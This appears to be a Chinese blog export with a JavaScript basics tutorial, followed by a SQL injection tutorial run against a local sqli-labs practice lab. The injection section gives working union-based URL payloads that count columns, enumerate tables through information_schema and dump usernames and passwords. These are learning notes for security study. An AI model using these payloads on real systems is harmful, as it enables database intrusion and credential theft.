<h4 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				定义一个用来求两个数的和的函数</span><br><span class="line">				  可以在函数的()中来指定一个或多个形参(形式参数)</span><br><span class="line">				  多个形参之间使用,号隔开，声明形参就相当于在函数内部声明了对应的变量</span><br><span class="line">				  但是并不赋值</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			function sum(a,b)&#123;</span><br><span class="line">				document.write(a+b);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				在调用函数时，可以在()中指定实参</span><br><span class="line">				  实参将会赋值给函数中对应的形参</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">			&#x2F;&#x2F; sum(5,2);</span><br><span class="line">			sum(123,56); </span><br><span class="line">			sum(123,&quot;hello&quot;);</span><br><span class="line">			*&#x2F;</span><br><span class="line">		   </span><br><span class="line">		   &#x2F;* </span><br><span class="line">			 调用函数时，解析器不会检查实参类型</span><br><span class="line">			   所以要注意是否有可能会接收到非法的参数，如果有可能则要对我们的参数进行类型检查</span><br><span class="line">			   函数的实参可以是任意的数据类型</span><br><span class="line">		   *&#x2F;</span><br><span class="line">		  </span><br><span class="line">		  &#x2F;* </span><br><span class="line">			调用函数时，解析器也不会检查实参数量</span><br><span class="line">				多余的实参不会被赋值</span><br><span class="line">			如果实参的数量少于形参的数量，则没有对应实参的形参将是undefined</span><br><span class="line">			</span><br><span class="line">		  *&#x2F;</span><br><span class="line">		  &#x2F;&#x2F; sum(123,456,1);</span><br></pre></td></tr></table></figure>

<h4 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				创建一个函数，用来计算三个数的和</span><br><span class="line">				可以使用return 来设置函数的返回值</span><br><span class="line">					语法：</span><br><span class="line">						return 值</span><br><span class="line">				return后的值将会作为函数的执行结果返回，</span><br><span class="line">					可以定义一个变量，来接收该结果</span><br><span class="line">					</span><br><span class="line">				在函数中return后的语句都不会被执行</span><br><span class="line">				</span><br><span class="line">				如果return语句后面不跟任何值就相当于返回一个undefined</span><br><span class="line">				如果函数中不屑return,则也会返回undefined</span><br><span class="line">				</span><br><span class="line">				return后可以跟任意类型的值</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			function sum(a,b,c)&#123;</span><br><span class="line">				&#x2F;&#x2F; document.write(a+b+c);</span><br><span class="line">				var d &#x3D; a+b+c;</span><br><span class="line">				return d;</span><br><span class="line">			&#125;</span><br><span class="line">			&#x2F;&#x2F; 调用函数</span><br><span class="line">			&#x2F;&#x2F; 变量return的值就是函数的执行结果</span><br><span class="line">			&#x2F;&#x2F; 函数返回什么result的值就是什么</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			var result &#x3D; sum(1,2,3);</span><br><span class="line">			document.write(&quot;result &#x3D; &quot;+ result);</span><br></pre></td></tr></table></figure>

<h4 id="立即执行函数"><a href="#立即执行函数" class="headerlink" title="立即执行函数"></a>立即执行函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 如果直接写匿名函数执行会报错，如果用()括号将他圈起来，</span><br><span class="line">			&#x2F;&#x2F; 整明他是一个整体就不会报错</span><br><span class="line">			(function()&#123;</span><br><span class="line">				alert(&quot;匿名函数~~&quot;);</span><br><span class="line">			&#125;);</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 函数对象()</span><br><span class="line">			&#x2F;* </span><br><span class="line">				立即执行函数</span><br><span class="line">					函数定义完，立即被调用，这种函数叫做立即执行函数</span><br><span class="line">					立即执行往往只会执行1次</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			&#x2F;* (function()&#123;</span><br><span class="line">				alert(&quot;匿名函数~~&quot;);</span><br><span class="line">			&#125;)(); *&#x2F;</span><br><span class="line">			</span><br><span class="line">			(function(a,b)&#123;</span><br><span class="line">				document.write(&quot;a &#x3D; &quot;+ a);</span><br><span class="line">				document.write(&quot;b &#x3D; &quot;+ b);</span><br><span class="line">			&#125;)(123,222);</span><br></pre></td></tr></table></figure>

<h4 id="枚举对象中的属性"><a href="#枚举对象中的属性" class="headerlink" title="枚举对象中的属性"></a>枚举对象中的属性</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				枚举对象中的属性</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			var obj &#x3D; &#123;</span><br><span class="line">				name:&quot;孙悟空&quot;,</span><br><span class="line">				age:18,</span><br><span class="line">				gender:&quot;男&quot;,</span><br><span class="line">				address:&quot;花果山&quot;</span><br><span class="line">			&#125;;</span><br><span class="line">			&#x2F;&#x2F; 例如我们不知道obj中的属性，</span><br><span class="line">			&#x2F;&#x2F; 但是我们想要知道obj中都有什么属性</span><br><span class="line">			&#x2F;&#x2F; 枚举对象中的属性</span><br><span class="line">			&#x2F;&#x2F; 使用for in 语句</span><br><span class="line">			&#x2F;* </span><br><span class="line">				语法：</span><br><span class="line">					for(var 变量 in 对象)&#123;</span><br><span class="line">						语句...</span><br><span class="line">					&#125;</span><br><span class="line">					</span><br><span class="line">				for...in语句，对象中有几个属性，循环体就会执行几次</span><br><span class="line">					每次执行时，会将对象中的一个属性的名字赋值给变量</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			&#x2F;* for(var n in obj)&#123;</span><br><span class="line">				document.write(&quot;属性名&quot;+n+&quot;&lt;br &#x2F;&gt;&quot;);</span><br><span class="line">			&#125; *&#x2F;</span><br><span class="line">			</span><br><span class="line">			for(var n in obj)&#123;</span><br><span class="line">				document.write(&quot;属性名 :&quot;+n+&quot;&lt;br &#x2F;&gt;&quot;);</span><br><span class="line">				document.write(obj[n]+&quot;&lt;br &#x2F;&gt;&quot;);</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">作用域</span><br><span class="line">				  - 作用域指一个变量的作用的范围</span><br><span class="line">				  - 在JS中一共有两种作用域：</span><br><span class="line">						1、全局作用域</span><br><span class="line">								- 直接编写在scripe标签中的JS代码，都在全局作用域中</span><br><span class="line">								- 全局作用域在页面打开时创建，在页面关闭时销毁</span><br><span class="line">								- 在全局作用域中有一个全局对象window，</span><br><span class="line">										它代表的是一个浏览器的窗口，它由浏览器创建，我们可以直接使用</span><br><span class="line">								- 在全局作用域中，</span><br><span class="line">									创建的变量都会作为window对象的属性保存</span><br><span class="line">									创建的函数都会做为window对象的方法保存</span><br><span class="line">								- 全局作用域中的变量都是全局变量，</span><br><span class="line">									在页面的任意的部分都可以访问到</span><br><span class="line">								</span><br><span class="line">						2、函数作用域</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			var a &#x3D; 10</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; console.log(window.a);</span><br><span class="line">			</span><br><span class="line">			function fun()&#123;</span><br><span class="line">				console.log(&quot;Fun函数&quot;);</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<h4 id="变量的声明提前"><a href="#变量的声明提前" class="headerlink" title="变量的声明提前"></a>变量的声明提前</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				变量的声明提前</span><br><span class="line">				  - 使用var关键字声明的变量，会在所有的代码执行之前被声明（但是不会赋值）</span><br><span class="line">						但是如果声明变量时不使用var关键字，则变量不会被提前声明</span><br><span class="line">						</span><br><span class="line">				函数的声明提前</span><br><span class="line">					- 使用函数声明形式创建的函数function 函数()&#123;&#125;</span><br><span class="line">							他会在所有代码执行之前就被创建，所以我们可以在函数声明前来调用函数 </span><br><span class="line">							</span><br><span class="line">					使用函数表达式创建的函数，不能被声明提前，所以不能在声明前调用</span><br><span class="line">			*&#x2F;</span><br><span class="line">		   </span><br><span class="line">		   console.log(&quot;a &#x3D; &quot;+a);</span><br><span class="line">		   var a &#x3D; 123;</span><br><span class="line">		   </span><br><span class="line">		   </span><br><span class="line">		   &#x2F;&#x2F;fun();</span><br><span class="line">		   fun2()</span><br><span class="line">		   </span><br><span class="line">		   &#x2F;&#x2F; 函数声明，会被提前创建</span><br><span class="line">		   function fun()&#123;</span><br><span class="line">		   	console.log(&quot;Fun函数&quot;);</span><br><span class="line">		   &#125;</span><br><span class="line">		   </span><br><span class="line">		   &#x2F;&#x2F; 变量会被提前创建，但是函数表达式不会被提前创建</span><br><span class="line">		    var fun2 &#x3D; function()&#123;</span><br><span class="line">		   	console.log(&quot;Fun函数2&quot;);</span><br><span class="line">		   &#125;;</span><br></pre></td></tr></table></figure>

<h4 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				函数作用域</span><br><span class="line">				  - 调用函数时创建函数作用域，函数执行完毕以后，函数作用域销毁</span><br><span class="line">				  - 每调用一次函数就会创建一个新的函数作用域，他们之间是相互独立的</span><br><span class="line">				  - 在函数作用域中可以访问到全局变量，在全局作用域中无法访问到函数作用的变量</span><br><span class="line">							可以理解为:内部可以访问外部，但外部不能访问内部</span><br><span class="line">				  - 当在函数作用域操作一个变量时，他会先在自身作用域寻找，如果有就直接使用</span><br><span class="line">						如果没有则向上一级作用域寻找，直到找到全局作用域</span><br><span class="line">						如果全局作用域中依然没有找到，则会报错ReferenceError</span><br><span class="line">				  - 在函数中要访问全局变量可以使用window对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* var a &#x3D; 10</span><br><span class="line">			function fun()&#123;</span><br><span class="line">				</span><br><span class="line">				var b &#x3D; 20;</span><br><span class="line">				console.log(&quot;a &#x3D; &quot;+a);</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			fun();</span><br><span class="line">			cosole.log(&quot;b &#x3D; &quot;+b); *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				在函数作用域中也有声明提前的特性，</span><br><span class="line">					使用var关键字声明变量，会在函数中所有的代码执行之前被声明</span><br><span class="line">					函数声明也会在函数中所有的代码执行之前执行</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			function fun3()&#123;</span><br><span class="line">				fun4();</span><br><span class="line">				&#x2F;&#x2F; console.log(a);		&#x2F;&#x2F; 返回undefined	,因为定义的变量在下面，var a 已经提前声明好了，但是没赋值</span><br><span class="line">				</span><br><span class="line">				var a &#x3D; 35;</span><br><span class="line">				</span><br><span class="line">				function fun4()&#123;</span><br><span class="line">					alert(&quot;fun4函数能否被调用&quot;);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			fun3();</span><br><span class="line">			</span><br><span class="line">			var c &#x3D; 22;</span><br><span class="line">			&#x2F;* </span><br><span class="line">				在函数中，不使用var声明的变量都会成为全局变量</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			function fun5()&#123;</span><br><span class="line">				&#x2F;&#x2F; console.log(&quot;c &#x3D; &quot;+ c);</span><br><span class="line">				c &#x3D; 10;</span><br><span class="line">			&#125;</span><br><span class="line">			fun5</span><br></pre></td></tr></table></figure>

<h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				解析器在调用函数每次都会向函数内部传递进一个隐含的参数</span><br><span class="line">					这个隐含参数就是this.this指向的是一个都西昂，</span><br><span class="line">					这个对象我们称为函数执行的上下文对象</span><br><span class="line">					根据函数的调用方式不同，this会指向不同的对象</span><br><span class="line">						1、以函数的形式调用时，this永远都是window</span><br><span class="line">						2、以方法的形式调用是，this就是调用方法的那个对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			&#x2F;* </span><br><span class="line">			function fun()&#123;</span><br><span class="line">				&#x2F;&#x2F; console.log(&quot;a &#x3D; &quot;+a+&quot;b &#x3D; &quot;+b);</span><br><span class="line">				console.log(this.name);</span><br><span class="line">			&#125;</span><br><span class="line">			&#x2F;&#x2F; fun();</span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			var obj&#x3D;&#123;</span><br><span class="line">				name:&quot;孙悟空&quot;,</span><br><span class="line">				sayName:fun</span><br><span class="line">			&#125;;</span><br><span class="line">			</span><br><span class="line">			var obj2 &#x3D; &#123;</span><br><span class="line">				name:&quot;猪八戒&quot;,</span><br><span class="line">				sayName:fun</span><br><span class="line">				&#125;;</span><br><span class="line">			&#x2F;&#x2F; console.log(obj.sayName &#x3D;&#x3D; fun);</span><br><span class="line">			var name &#x3D; &quot;全局的name属性&quot;;</span><br><span class="line">			&#x2F;&#x2F; obj.sayName();</span><br><span class="line">			&#x2F;&#x2F; 以函数的而形式调用，this是window</span><br><span class="line">			&#x2F;&#x2F; fun();</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 以方法的形式调用，this是调用方法的对象</span><br><span class="line">			&#x2F;&#x2F; obj.sayName();</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 创建一个name变量</span><br><span class="line">			var name &#x3D; &quot;全局&quot;;</span><br><span class="line">			obj2.sayName();</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 创建一个fun()函数</span><br><span class="line">			function fun()&#123;</span><br><span class="line">				console.log(this.name);</span><br><span class="line">			&#125;;</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 创建两个对象</span><br><span class="line">			var obj &#x3D; &#123;</span><br><span class="line">				name:&quot;孙悟空&quot;,</span><br><span class="line">				sayName:fun</span><br><span class="line">			&#125;;</span><br><span class="line">			var obj2 &#x3D; &#123;</span><br><span class="line">				name:&quot;猪八戒&quot;,</span><br><span class="line">				sayName:fun</span><br><span class="line">			&#125;;</span><br><span class="line">			&#x2F;&#x2F; 我们调用sayName()时可以输出obj的名字</span><br><span class="line">			obj.sayName();</span><br></pre></td></tr></table></figure>

<h4 id="使用工厂方法创建对象"><a href="#使用工厂方法创建对象" class="headerlink" title="使用工厂方法创建对象"></a>使用工厂方法创建对象</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				创建一个对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			&#x2F;* var obj &#x3D; &#123;</span><br><span class="line">				name:&quot;孙悟空&quot;,</span><br><span class="line">				age:18,</span><br><span class="line">				gender:&quot;男&quot;,</span><br><span class="line">				sayName:function()&#123;</span><br><span class="line">					alert(this.name);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;; *&#x2F;</span><br><span class="line">			&#x2F;* </span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">	使用工厂方法创建对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			function createPerson(name,age,gender)&#123;</span><br><span class="line">				&#x2F;&#x2F; 创建一个新的对象</span><br><span class="line">				var obj &#x3D;new Object();</span><br><span class="line">				</span><br><span class="line">				&#x2F;&#x2F; 向对象中添加属性</span><br><span class="line">				obj.name&#x3D;name;</span><br><span class="line">				obj.age&#x3D;age;</span><br><span class="line">				obj.gender&#x3D;gender;</span><br><span class="line">				obj.sayName&#x3D;function()&#123;</span><br><span class="line">					alert(this.name);</span><br><span class="line">					</span><br><span class="line">				&#125;;</span><br><span class="line">				&#x2F;&#x2F; 将新的对象返回</span><br><span class="line">				return obj;</span><br><span class="line">			&#125;</span><br><span class="line">			var obj2 &#x3D; createPerson(&quot;猪八戒&quot;,16,&quot;男&quot;);</span><br><span class="line">			var obj3 &#x3D; createPerson(&quot;玉兔精&quot;,22,&quot;女&quot;);</span><br><span class="line">			var obj4 &#x3D; createPerson(&quot;唐僧&quot;,25,&quot;男&quot;);</span><br><span class="line">			obj3.sayName();</span><br></pre></td></tr></table></figure>

<h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				创建一个构造函数，专门用来创建Person对象的</span><br><span class="line">				  构造函数就是一个普通的函数，创建方式和普通函数没有区别</span><br><span class="line">				  不同的是，构造函数习惯上首字母大写</span><br><span class="line">				  </span><br><span class="line">				构造函数和普通函数的区别就是调用方式的不同</span><br><span class="line">				  普通函数就是直接调用，而构造函数需要使用new关键字来调用</span><br><span class="line">				  </span><br><span class="line">				构造函数执行流程</span><br><span class="line">				  1、立刻创建一个新的对象</span><br><span class="line">				  2、将新建的对象设置为函数中的this,在构造函数中可以使用this来引用新建的对象</span><br><span class="line">				  3、逐行执行函数中的代码</span><br><span class="line">				  4、将新建的对象作为返回值返回</span><br><span class="line">				  </span><br><span class="line">				使用同一个构造函数创建的对象，我们称为一类对象</span><br><span class="line">				  我们将通过一个构造函数创建的对象，称为是该类的实例</span><br><span class="line">			 </span><br><span class="line">				this的情况</span><br><span class="line">					1、当以函数的形式调用时，this是window</span><br><span class="line">					2、当以方法的形式调用时，谁调用方法this就是谁</span><br><span class="line">					3、当以构造函数的形式调用时，this就是新创建的那个对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			function Person(name,age)&#123;</span><br><span class="line">				this.name &#x3D; name;</span><br><span class="line">				this.age &#x3D; age;</span><br><span class="line">				this.sayName &#x3D; function()&#123;</span><br><span class="line">					alert(this.name);</span><br><span class="line">				&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			var per &#x3D; new Person(&quot;孙悟空&quot;,18);</span><br><span class="line">			var per2 &#x3D; new Person(&quot;猪八戒&quot;,20);</span><br><span class="line">			</span><br><span class="line">			&#x2F;* console.log(per);</span><br><span class="line">			console.log(per2); *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				使用instanceof可以检查一个对象是否是一个类的实例</span><br><span class="line">				语法:</span><br><span class="line">					对象 instanceof 构造函数</span><br><span class="line">				如果是返回true，否则返回false</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				所有的对象都是Object的后代，</span><br><span class="line">				  所以任何对象和Object做instanceof检查时都会返回true</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			console.log(per instanceof Person);</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				用来创建狗的对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			&#x2F;* function createDog(name,age)&#123;</span><br><span class="line">				var obj &#x3D; new Object();</span><br><span class="line">				obj.name &#x3D; name;</span><br><span class="line">				obj.age &#x3D; age;</span><br><span class="line">				obj.sayHello &#x3D; function()&#123;</span><br><span class="line">					alert(&quot;汪汪~~~&quot;);</span><br><span class="line">				&#125;;</span><br><span class="line">				return obj;</span><br><span class="line">			&#125; *&#x2F;</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				使用工厂方法创建的对象，使用的构造函数都是Object</span><br><span class="line">				  所以创建的对象都是Object这个类型</span><br><span class="line">				  就导致我们无法区分出多种不同类型的对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; var dog &#x3D; createDog(&quot;大福&quot;,3);</span><br><span class="line">			&#x2F;&#x2F; dog.sayHello();</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2020/04/03/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h4><p>SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过构造不同的sql语句来实现对数据库的任意操作</p>
<h4 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h4><p>SQL注入的而产生的需要满足两个条件：</p>
<ul>
<li>参数用户可控：前端传给后端的参数内容是用户可以控制的</li>
<li>参数代入数据库查询：传入的参数拼接到SQL语句查询，且带入数据库查询</li>
</ul>
<h5 id="当传入的参数为1’时-数据库执行代码如下"><a href="#当传入的参数为1’时-数据库执行代码如下" class="headerlink" title="当传入的参数为1’时,数据库执行代码如下"></a>当传入的参数为1’时,数据库执行代码如下</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>

<h5 id="这不符合数据库语法规范，所以会报错，传入参数and-1-1时，执行的SQL语句如下"><a href="#这不符合数据库语法规范，所以会报错，传入参数and-1-1时，执行的SQL语句如下" class="headerlink" title="这不符合数据库语法规范，所以会报错，传入参数and 1=1时，执行的SQL语句如下"></a>这不符合数据库语法规范，所以会报错，传入参数and 1=1时，执行的SQL语句如下</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>

<p>因为1=1为真，where语句中id=1也为真，页面返回与id=1相同的结果。当传入参数and 1=2 时，1=2不成立，返回与id=1不同的结果。由此可以判断ID参数存在sql注入。</p>
<h4 id="SQL注入相关知识"><a href="#SQL注入相关知识" class="headerlink" title="SQL注入相关知识"></a>SQL注入相关知识</h4><p>在mysql5.0版本后，默认在数据库有一个information_schema的库，要记住其中三个表名，</p>
<p>分别是SCHEMATA(schemata)、TABLES(tables)、COLUMNS(columns)。</p>
<ul>
<li><strong>SCHEMATA</strong>表存储该用户创建的所有数据库的<strong>库名</strong>，该表中记录<strong>数据库字段</strong>的名为<strong>SCHEMA_NAME(schema_name)</strong></li>
<li><strong>TABLES</strong>表存储该用户创建的所有数据库的<strong>库名</strong>和<strong>表名</strong>，该表中记录数据库<strong>库名</strong>和<strong>表名</strong>的字段，分别为<strong>TABLE_SHCEMA(table_schema)</strong>和<strong>TABLE_NAME(table_name)</strong></li>
<li><strong>COLUMNS</strong>表存储该用户创建的所有数据库的<strong>库名、表名</strong>和<strong>字段名</strong>，该表中记录数据库<strong>库名、表名和字段名</strong>的字段为，<strong>TABLE_SCHEMA(table_schema)、TABLE_NAME(table_name)、COLUMN_NAME(column_name)</strong></li>
</ul>
<h4 id="需要记住的几个函数"><a href="#需要记住的几个函数" class="headerlink" title="需要记住的几个函数"></a>需要记住的几个函数</h4><ul>
<li><h5 id="database-查看当前数据库"><a href="#database-查看当前数据库" class="headerlink" title="database()查看当前数据库"></a>database()查看当前数据库</h5></li>
<li><h5 id="version-查看当前版本"><a href="#version-查看当前版本" class="headerlink" title="version()查看当前版本"></a>version()查看当前版本</h5></li>
<li><h5 id="user-查看当前用户"><a href="#user-查看当前用户" class="headerlink" title="user()查看当前用户"></a>user()查看当前用户</h5></li>
</ul>
<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>MySQL中常见注释符的表达方式：#–空格或/* */</p>
<h3 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h3><h5 id="Union注入也叫联合注入"><a href="#Union注入也叫联合注入" class="headerlink" title="Union注入也叫联合注入"></a>Union注入也叫联合注入</h5><p><a href="http://127.0.0.1/Less-1/?id=1测试地址" target="_blank" rel="noopener">http://127.0.0.1/Less-1/?id=1测试地址</a></p>
<h5 id="测试当前页面出错信息"><a href="#测试当前页面出错信息" class="headerlink" title="测试当前页面出错信息"></a>测试当前页面出错信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当1&#x3D;1的时候为真返回正确页面</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;1</span><br><span class="line"></span><br><span class="line">但1&#x3D;2时返回还是正确页面，</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;2&#39;</span><br><span class="line"></span><br><span class="line">所以可以尝试在id&#x3D;1后面加上单引号&#39; ，id&#x3D;1&#39;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39;</span><br><span class="line">这里报错了，说明存在注入点</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897216762.png" alt="1583897216762"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用order by 查询字段数，因为使用单引号了&#39; 所以要用注释符注释一下，我们这里可以用# 也可以用--+</span><br><span class="line">其中%23代表#井号</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4%23</span><br><span class="line"></span><br><span class="line">我们发现出错了，说没有4这个列</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897341992.png" alt="1583897341992"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里我们尝试一下3看看有没有这个列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3%23</span><br><span class="line"></span><br><span class="line">页面返回正常，说明字段数是3</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897462676.png" alt="1583897462676"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们这里使用联合查询，查看一下当前版本和库名</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,3%23</span><br><span class="line"></span><br><span class="line">这里返回了2和3</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897552384.png" alt="1583897552384"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们可以在2和3的字段上查询一下库名和版本号</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,version(),database()%23</span><br><span class="line"></span><br><span class="line">版本号是5.5.53，当前库名是security</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897631314.png" alt="1583897631314"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们知道了版本号和当前库名之后就要进行查询当前库中的表，因为当前版本是5.0以上所以数据库中有information_schema这个库，我们来查询一下</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br><span class="line"></span><br><span class="line">这里我们查看了当前security下的表</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897798516.png" alt="1583897798516"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在大部分情况下用户的用用户名和密码都在users表中，我们来查看一下users表</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;--+</span><br><span class="line"></span><br><span class="line">发现有id，username，password，这些正是我们想要的</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905097676.png" alt="1583905097676"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看id，username，password字段的数据</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(id,username,password) from users--+</span><br><span class="line"></span><br><span class="line">这样我们想要的数据就查询出来了</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905244735.png" alt="1583905244735"></p>
<h3 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h3><h5 id="布尔注入，也叫盲注，"><a href="#布尔注入，也叫盲注，" class="headerlink" title="布尔注入，也叫盲注，"></a>布尔注入，也叫盲注，</h5><h5 id="这是我们的初始页面"><a href="#这是我们的初始页面" class="headerlink" title="这是我们的初始页面"></a>这是我们的初始页面</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905377875.png" alt="1583905377875"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先测试页面报错信息</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39;</span><br><span class="line">这里使用单引号出错了，加上注释符返回成功页面如下。</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905447719.png" alt="1583905447719"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905503272.png" alt="1583905503272"></p>
